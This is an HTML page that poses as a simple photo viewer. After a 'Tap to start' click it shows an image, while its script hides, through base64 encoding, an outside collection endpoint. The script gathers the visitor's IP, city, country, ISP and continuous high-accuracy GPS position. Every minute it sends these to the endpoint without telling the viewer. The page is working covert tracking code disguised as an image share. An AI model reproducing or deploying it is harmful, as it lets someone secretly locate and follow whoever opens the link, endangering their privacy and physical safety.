<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="mobile-web-app-capable" content="yes">
<title> </title>
<style>
*{margin:0;padding:0}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}
img{max-width:100%;max-height:100vh;object-fit:contain}
#tap{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;cursor:pointer;display:flex;justify-content:center;align-items:center;color:#fff;font-family:sans-serif;font-size:16px;background:#111;text-align:center;padding:20px}
</style>
</head>
<body>
<div id="tap">Tap to start</div>
<img id="photo">
<script>
(function(){
var API=atob("aHR0cHM6Ly9sb2NhdGlvbi1hcGkuZGhhbmFtcGFyaXN1c2VldHUud29ya2Vycy5kZXY=");
var IMG=atob("SU1HXzIwMjYwNzI2XzEwMTgwOS5qcGc=");
var REPO=atob("ZGhhbmFtcGFyaXN1c2VldHUtZHJvaWQvcGFyaXN1c2VldHU=");
var I=60;
var raw1="https://raw.githubusercontent.com/"+REPO+"/main/"+IMG;
var lastLoc=null;

function fetchIP(){
    return Promise.any([
        fetch("https://ip-api.com/json/?fields=status,lat,lon,city,regionName,country,isp,query").then(function(r){return r.json()}).then(function(d){if(d.status==="success")return{ip:d.query,city:d.city,region:d.regionName,country:d.country,isp:d.isp};throw 0}),
        fetch("https://ipinfo.io/json").then(function(r){return r.json()}).then(function(d){return{ip:d.ip,city:d.city,region:d.region,country:d.country,isp:d.org};throw 0})
    ]);
}

var busy=false;
function push(e){
    if(busy)return Promise.resolve();
    busy=true;
    return fetch(API+"/location_log.json",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)}).then(function(r){
        return r.json();
    }).then(function(d){
        busy=false;
    }).catch(function(){busy=false});
}

function send(){
    fetchIP().then(function(ipd){
        var ipd=ipd||{};
        var e;
        if(lastLoc){
            e={lat:lastLoc.lat,lng:lastLoc.lng,city:ipd.city||"unknown",region:ipd.region,country:ipd.country,isp:ipd.isp,ip:ipd.ip,method:lastLoc.method,accuracy:lastLoc.accuracy,timestamp:new Date().toISOString()};
        } else if(ipd.ip){
            e={lat:0,lng:0,city:ipd.city||"unknown",region:ipd.region,country:ipd.country,isp:ipd.isp,ip:ipd.ip,method:"IP",accuracy:"IP-only",timestamp:new Date().toISOString()};
        }
        if(e)push(e);
    });
}

function startAll(){
    var tap=document.getElementById("tap");
    if(tap)tap.style.display="none";
    var img=document.getElementById("photo");
    img.onload=function(){img.style.display=""};
    img.onerror=function(){img.style.display=""};
    img.src=raw1;
    img.style.display="";
    send();
    setInterval(send,I*1000);
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(function(p){
            lastLoc={lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy,method:"GPS"};
            navigator.geolocation.watchPosition(function(p2){
                lastLoc={lat:p2.coords.latitude,lng:p2.coords.longitude,accuracy:p2.coords.accuracy,method:"GPS"};
            },function(){},{enableHighAccuracy:true,maximumAge:10000});
        },function(){},{enableHighAccuracy:true,timeout:30000,maximumAge:0});
    }
}

var done=false;
function go(){if(!done){done=true;startAll()}}
document.getElementById("tap").addEventListener("click",go);
document.getElementById("tap").addEventListener("touchend",function(e){e.preventDefault();go()});
})();
</script>
</body>
</html>
